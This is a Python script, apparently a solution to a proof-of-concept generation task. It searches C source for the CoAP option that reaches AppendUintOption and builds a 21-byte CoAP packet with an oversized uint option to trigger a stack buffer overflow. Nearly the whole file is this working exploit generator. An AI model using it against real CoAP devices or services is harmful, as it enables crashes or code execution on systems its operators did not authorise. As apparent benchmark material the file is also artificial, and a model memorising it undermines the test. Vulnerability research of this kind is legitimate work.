import os
import re

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the stack buffer overflow in AppendUintOption.
        The vulnerability typically occurs when a uint option is processed with a length
        larger than the internal stack buffer (usually 8 bytes), and the function
        fails to validate the length before copying.
        
        We scan the source code to identify which CoAP Option Number calls AppendUintOption,
        then generate a 21-byte CoAP packet with that option and an overflowing payload.
        """
        target_delta = 12  # Default to Content-Format (Option 12) if scan fails
        
        # Map of common CoAP option macros to their integer values
        option_map = {
            'COAP_OPTION_IF_MATCH': 1,
            'COAP_OPTION_URI_HOST': 3,
            'COAP_OPTION_ETAG': 4,
            'COAP_OPTION_IF_NONE_MATCH': 5,
            'COAP_OPTION_OBSERVE': 6,
            'COAP_OPTION_URI_PORT': 7,
            'COAP_OPTION_LOCATION_PATH': 8,
            'COAP_OPTION_URI_PATH': 11,
            'COAP_OPTION_CONTENT_FORMAT': 12,
            'COAP_OPTION_MAX_AGE': 14,
            'COAP_OPTION_URI_QUERY': 15,
            'COAP_OPTION_ACCEPT': 17,
            'COAP_OPTION_LOCATION_QUERY': 20,
            'COAP_OPTION_BLOCK2': 23,
            'COAP_OPTION_BLOCK1': 27,
            'COAP_OPTION_SIZE2': 28,
            'COAP_OPTION_PROXY_URI': 35,
            'COAP_OPTION_PROXY_SCHEME': 39,
            'COAP_OPTION_SIZE1': 60,
        }
        
        found = False
        
        # Heuristic: Scan source files to find which option triggers AppendUintOption
        for root, dirs, files in os.walk(src_path):
            for file in files:
                if file.endswith(('.c', '.cpp', '.cc', '.h', '.ino')):
                    path = os.path.join(root, file)
                    try:
                        with open(path, 'r', encoding='utf-8', errors='ignore') as f:
                            content = f.read()
                        
                        if "AppendUintOption" in content:
                            # Search for the control flow leading to this call
                            # We look for "case X:" or "if (opt == X)" preceding the call
                            indices = [m.start() for m in re.finditer(r'AppendUintOption', content)]
                            for idx in indices:
                                # Look in the preceding 1000 characters
                                start_search = max(0, idx - 1000)
                                chunk = content[start_search:idx]
                                
                                # Regex to capture case values or equality checks
                                # Matches: case 12:, case COAP_OPTION_..., if(x==12), etc.
                                patterns = [
                                    r'case\s+([A-Za-z0-9_]+)\s*:',
                                    r'==\s*([A-Za-z0-9_]+)',
                                    r'=\s*([A-Za-z0-9_]+)\s*;' 
                                ]
                                
                                potential_options = []
                                for pat in patterns:
                                    potential_options.extend(list(re.finditer(pat, chunk)))
                                
                                # Sort by position to find the closest one preceding the call
                                potential_options.sort(key=lambda x: x.start())
                                
                                if potential_options:
                                    # Check the last few candidates
                                    for match in reversed(potential_options):
                                        val_str = match.group(1)
                                        if val_str.isdigit():
                                            target_delta = int(val_str)
                                            found = True
                                            break
                                        elif val_str in option_map:
                                            target_delta = option_map[val_str]
                                            found = True
                                            break
                                if found: break
                    except Exception:
                        pass
                if found: break
            if found: break

        # Construct the PoC
        # Goal: Total length 21 bytes.
        # Structure: Header (4) + Option (Header + Payload) = 21.
        
        # CoAP Header: Ver=1, Type=CON(0), TKL=0, Code=GET(1), MsgID=0x1234
        header = b'\x40\x01\x12\x34'
        
        # Calculate Option Delta Encoding
        delta_nib = 0
        delta_ext = b''
        if target_delta <= 12:
            delta_nib = target_delta
        elif target_delta <= 268:
            delta_nib = 13
            delta_ext = (target_delta - 13).to_bytes(1, 'big')
        else:
            delta_nib = 14
            delta_ext = (target_delta - 269).to_bytes(2, 'big')
            
        # We need to fill the rest of the 21 bytes.
        # Total Available for Option = 21 - 4 = 17 bytes.
        # Option structure: [Byte0: Delta|Len] [DeltaExt?] [LenExt?] [Payload]
        # Size = 1 + len(delta_ext) + len(len_ext) + len(payload)
        
        remaining_after_delta = 17 - 1 - len(delta_ext)
        
        # We want to maximize payload length to trigger overflow.
        # We try to use 1 byte extended length if possible to consume header space.
        # If we use 1 byte ext length, cost is 1. Payload = Remaining - 1.
        # We need Payload >= 13 for this to be valid encoding.
        
        p_len = remaining_after_delta - 1
        
        len_nib = 0
        len_ext = b''
        payload = b''
        
        if 13 <= p_len <= 268:
            # Matches standard extended length encoding
            len_nib = 13
            len_ext = (p_len - 13).to_bytes(1, 'big')
            payload = b'A' * p_len
        else:
            # Fallback: if delta was large, p_len might be small (<13)
            # Use nibble directly
            p_len = remaining_after_delta
            if p_len <= 12:
                len_nib = p_len
                len_ext = b''
                payload = b'A' * p_len
            else:
                # Should not happen for small deltas (<=50)
                len_nib = 0
                payload = b'A' * p_len 

        first_byte = (delta_nib << 4) | len_nib
        poc = header + bytes([first_byte]) + delta_ext + len_ext + payload
        
        return poc